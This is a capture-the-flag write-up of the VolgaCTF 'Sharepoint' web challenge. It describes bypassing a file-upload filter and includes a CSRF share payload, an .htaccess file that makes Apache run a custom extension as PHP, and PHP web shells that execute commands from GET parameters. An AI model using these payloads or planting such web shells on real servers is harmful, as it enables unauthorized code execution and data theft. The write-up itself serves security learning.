---
title:  "VolgaCTF -- Sharepoint Writeup"
categories:
  - VolgaCTF
tags:
  - challenge
  - web
  - writeup
  - ctf
  - volgactf
  - sharepoint
---
<div class="notice--info">
<strong>What I learned from this:</strong>
<ul>
<li>Check for multiple attack vectors</li>
<li>Basic knowledge on HTTP Servers (in this case Apache)</li>
<li>The difference between PHP's <code>exec</code>, <code>system</code> and <code>passthru</code></li>
</ul>
</div>

## Challenge Description

Sharepoint was a 200 point challenge in the web category of VolgaCTF. The challenge description was the following:

"*Look! I wrote a good service for sharing your files with your friends, enjoy)*"

The first thing we see upon opening the webpage is a login form, which also works as a registration form, as providing a username/password combo will give further access.

When logged, a user has access to four more actions:

- Upload: which allows a user to upload files;
- Files: which allows a user to access their uploaded files;
- Share: which allows a user to accept share requests from other users;
- Logout: well, logs out the user.

My first impression, based on what was available, was that we probably had to access some other user's file, which probably contained the flag.

**Spoiler alert**: I was wrong.

## Uploading and Sharing

On the `upload.php` page we had some restrictions on the uploaded file's extension, as we couldn't upload `.php` or `.html`.

After uploading some files, including an HTML file with no extension, I checked the `files.php` which showed a list of uploaded files. The links had the format `/files/<username>/<filename>`, suggesting each user has his own directory to where files were uploaded. With each file there was also a share option that showed a form with a username as input.

When opening an uploaded file with HTML content the browser would normally render the file, meaning the `.html` restriction had no effect, as html would still be rendered.

By using the share functionality with another user, the `share.php` page would show a list of incoming share requests. The receiving end could either accept or reject the incoming share. Upon accepting the request, the shared file would show on `files.php` page, suggesting the shared file would be copied that user's directory.

## Attack Vector \#1

Knowing that the browser would render HTML files without extension, and convinced that the objective was to access another user's file, I started working on a CSRF attack that would make another user share a file with me. My idea was to share a crafted payload that when opened would allow a share with my account.

The share request was being made with a POST to `share.php` with the payload `username=<username>&filename=<filename>`, so I built a JavaScript snippet that would make a request to `share.php` with my username and the file I wanted the other user to share:

```html
<html>
    <script>
        var http = new XMLHttpRequest();
        http.open("POST", "../../share.php");
        http.setRequestHeader("X-Requested-With", "XMLHttpRequest");
        http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        http.send("username=jcfg&filename=flag");
    </script>
</html>
```

I tested the exploit and it worked perfectly, now I just had to figure out the target account and the file name.

I tried multiple accounts (e.g. `admin`, `volga`, `volgactf`), but none seemed to work, some didn't even exist... Since I noticed the database would reset every couple of minutes, I tried the exploit right after the reset, which lead me to believe that I went on the wrong direction, since no account existed.

## Attack Vector \#2

With the first vector being rendered not very useful, I turned my focus to the upload functionally.

With the belief that each user had his own directory and by checking that the server was running Apache, I came up with the idea of uploading my custom `.htaccess` file to see the directory listing:

```
Options +Indexes
```

This confirmed that I could manipulate `.htaccess`, but allowing listing didn't prove very useful, so I wondered if I could run code some other way.

I started googling about running code inside `.htaccess`, which lead me to something even more useful: [make Apache run HTML files like PHP](http://stackoverflow.com/questions/4687208/using-htaccess-to-make-all-html-pages-to-run-as-php-files). With knowledge of this option I created the following `.htaccess`:

```
Options +Indexes
AddType application/x-httpd-php .jcfg
```

This would make Apache run `.jcfg` files as PHP. I uploaded a simple `<?php echo 'hi'; ?>` with `.jcfg` extension and *voilà*, I got code running on the server.

Knowing how I could run code on the server, I uploaded a small script to execute commands server side:

```php
<?php
    echo exec($_GET['cmd']);
?>
```

I used `echo` to recursively list files (`echo *` and I kept adding `/*` to show more files) until I found the flag, which was in `/opt/flag.txt`, obtaining the challenge's flag:

`VolgaCTF{AnoTHer_apPro0Ach_to_file_Upl0Ad_with_PhP}`

## The Untold Story

The challenge was pretty simple, but I spent a lot of time (an entire afternoon actually) looking for the flag in the server. When trying `ls / -lah`, I was only getting a single line of output, so I started wondering if I was even looking at the right place. I ended up looking at the database (by leaking the source with `file_get_contents()`) and still couldn't find anything.

I wasn't the only one having problems finding the flag, as I saw people asking about the flag location, hence the tip about the flag location being **opt**imal.

When the CTF closed and people started talking about how they solved the challenges, I noticed people were saying they used `ls` and `find` to get the flag, which made me wonder about my method, so I went and checked the PHP documentation for `exec`, realising that this command only returns the last line from the result of the command.

I now knew why I wasn't getting the expected result, so I looked for an alternative, and hopefully better, method. I ended up building this small snippet that uses both `system` and `passthru`:

```php
<?php
if (isset($_GET['bin'])) {
    passthru($_GET['bin']);
} elseif (isset($_GET['cmd'])) {
    echo '<pre>';
    system($_GET['cmd']);
    echo '</pre>';
} else {
    echo 'No GET params set. Use bin=cmd" for passthru, cmd=cmd for system.';
}
?>
```
With this script I can use `system` for running commands with certainty that I get the full output and `passthru` if I want to get the raw bytes (useful to exfiltrate binary files).
